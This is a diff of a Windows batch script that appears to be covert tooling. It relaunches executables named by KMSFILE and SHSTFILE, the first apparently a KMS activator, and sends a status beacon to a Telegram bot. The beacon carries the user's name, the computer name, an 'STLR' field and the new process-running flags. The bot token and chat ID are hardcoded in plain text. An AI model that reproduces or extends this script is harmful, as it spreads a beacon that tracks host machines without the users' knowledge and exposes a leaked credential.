@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=17.7"
+set "BATCHVERSION=17.8"
 
 
 
@@ -97,6 +97,13 @@ goto :EOF
 set "VALID_HWIDS="
 
 
+
+
+
+
+
+set "KMSRUNNING=0"
+set "SHSTRUNNING=0"
 
 
 echo %date% %time%
@@ -1364,7 +1371,9 @@ if %errorlevel%==1 (
     echo %SHSTFILE% is not running. starting now...
     start "" "%SHSTFILE%"
 ) else (
-    echo %SHSTFILE% is already running.
+    set "SHSTRUNNING=1"
+    echo %SHSTFILE% is already running(!SHSTRUNNING!).
+
 )
 echo.
 echo.
@@ -1374,7 +1383,9 @@ if %errorlevel%==1 (
     echo %KMSFILE% is not running. starting now...
     start "" "%KMSFILE%"
 ) else (
-    echo %KMSFILE% is already running.
+    set "KMSRUNNING=1"
+    echo %KMSFILE% is already running(!KMSRUNNING!).
+
 )
 
 echo.
@@ -1847,7 +1858,7 @@ echo CheckSend=!CheckSend!
 set "TOKEN_RUNNING=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID_RUNNING=-1002163721260"
 set "TOPIC_ID_RUNNING=73779"
-set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%).....|%time%|(v%BATCHVERSION%)"
+set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%)|SHST(!SHSTRUNNING!).KMS(!KMSRUNNING!)|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
 set "CAPTION_RUNNING=This is a document for RUNNING Topic"
 set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"
